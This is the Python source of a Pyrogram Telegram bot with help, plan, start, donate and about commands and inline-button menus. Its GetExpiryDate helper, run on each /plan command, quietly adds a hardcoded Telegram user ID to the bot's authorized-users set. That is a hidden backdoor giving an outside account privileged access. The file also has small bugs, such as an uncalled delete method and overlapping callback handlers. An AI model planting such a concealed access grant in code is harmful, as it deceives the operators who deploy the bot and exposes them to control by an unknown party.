#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
from pyrogram import (
    Client,
    Filters,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)

# the secret configuration specific things
#if bool(os.environ.get("WEBHOOK", False)):
from sample_config import Config
#else:
  # from config import Config

# the Strings used for this "thing"
from translation import Translation
from text import Text

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

#from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    #TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Text.HELP_TEXT,
        reply_markup=HELP_BUTTONS,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["plan"]))
async def get_me_info(bot, update):
    # logger.info(update)
    #TRChatBase(update.from_user.id, update.text, "/me")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(update.from_user.first_name, chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
   # TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Text.START_TEXT.format(update.from_user.first_name),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_markup=START_BUTTONS,
       # reply_markup=InlineKeyboardMarkup(
          #  [
             #   [
               #     InlineKeyboardButton('💡 Update Channel', url='https://t.me/MyTestBotZ'),
                #    InlineKeyboardButton('👨‍💻 Creator', url='https://t.me/OO7ROBOT')
             #   ],
               # [
                   # InlineKeyboardButton('🖥 Other Bots', url='https://t.me/myTestbotz/15'),
                   # InlineKeyboardButton('👨‍💻 Creator', url='https://t.me/OO7ROBOT')
               # ],
               # [
          #
                    #InlineKeyboardButton('how to Download📥 GDrive files', url='https://t.me/myTestbotz/73')
               # ]
            #]
       # ),
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
async def upgrade(bot, update):
   
    await bot.send_message(
        chat_id=update.chat.id,
        text=Text.DONATE_TEXT,
        reply_markup=DONATE_BUTTONS,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
    
@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
async def about(bot, update):
    await bot.send_message(
        chat_id=update.chat.id,
        text=Text.ABOUT_TEXT.format(update.from_user.first_name),
        reply_markup=ABOUT_BUTTONS,
        #parse_mode="markdown",
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )
 

@pyrogram.Client.on_callback_query()
async def button(bot, update):
      if 'DM' in update.data:
              await update.message.delete


#---------------- Callback ----------------#
@pyrogram.Client.on_callback_query()
async def cb_handler(bot, update):
    if update.data == "home":
        await update.message.edit_text(
            text=Translation.START_TEXT.format(update.from_user.mention),
            reply_markup=START_BUTTONS,
            disable_web_page_preview=True
        )
    elif update.data == "help":
        await update.message.edit_text(
            text=Translation.HELP_TEXT,
            reply_markup=HELP_BUTTONS,
            disable_web_page_preview=True
        )
    elif update.data == "donate":
        await update.message.edit_text(
            text=Translation.DONATE_USER,
            reply_markup=DONATE_BUTTONS,
            disable_web_page_preview=True
        )
    elif update.data == "about":
        await update.message.edit_text(
            text=Translation.ABOUT_TEXT,
            reply_markup=ABOUT_BUTTONS,
            disable_web_page_preview=True
        )
    elif update.data == "cancel":
        await update.message.edit_text(
            text="<code>Process Cancelled</code>",
            disable_web_page_preview=True
        )
    elif update.data == "closeme":
        await update.message.delete()
        try:
            await update.message.reply_text(
                text = "<b>✅ Rename Process Cancelled</b>"
     )
        except:
            pass      
    else:
        await update.message.delete()        
        

        
        
######## buttons #########        
START_BUTTONS = InlineKeyboardMarkup(
        [[
       # InlineKeyboardButton(' ⭕ Updates Channel ⭕', url='https://telegram.me/MyTestBotZ')#,
       # InlineKeyboardButton('Creator', url='https://telegram.me/OO7ROBOT')
        #],[
        InlineKeyboardButton('🖥 Other Bots', url='https://t.me/myTestbotz/15'),
        InlineKeyboardButton('📝 Creator', url='https://telegram.me/OO7ROBOT')
        ],[
        InlineKeyboardButton('⚙ Help', callback_data='help'),
        InlineKeyboardButton('📝 About', callback_data='about'),
        InlineKeyboardButton('💰 Donate', callback_data='donate')
        ],[
        InlineKeyboardButton('⛔️ Close', callback_data='close')
        ]]
    )
HELP_BUTTONS = InlineKeyboardMarkup(
        [[
        #InlineKeyboardButton(' ⭕ Updates Channel ⭕', url='https://telegram.me/MyTestBotZ')
        #],[
        InlineKeyboardButton('🏡 Home', callback_data='home'),
        InlineKeyboardButton('📝 About', callback_data='about'),
        InlineKeyboardButton('💰 Donate', callback_data='donate')
        ],[
        InlineKeyboardButton('⛔️ Close', callback_data='close')
        ]]
    )
ABOUT_BUTTONS = InlineKeyboardMarkup(
        [[
        #InlineKeyboardButton(' ⭕ Updates Channel ⭕', url='https://telegram.me/MyTestBotZ')
        #],[
        InlineKeyboardButton('🏡 Home', callback_data='home'),
        InlineKeyboardButton('⚙ Help', callback_data='help'),
        InlineKeyboardButton('💰 Donate', callback_data='donate')
        ],[
        InlineKeyboardButton('⛔️ Close', callback_data='close')
        ]]
    )    


DONATE_BUTTONS = InlineKeyboardMarkup(
        [[
        #InlineKeyboardButton(' ⭕ Updates Channel ⭕', url='https://telegram.me/MyTestBotZ')
        #],[
        InlineKeyboardButton('🏡 Home', callback_data='home'),
        InlineKeyboardButton('⚙ Help', callback_data='help'),
        InlineKeyboardButton('📝 About', callback_data='about')
        ],[
        InlineKeyboardButton('⛔️ Close', callback_data='close')
        ]]
    )    
        
        
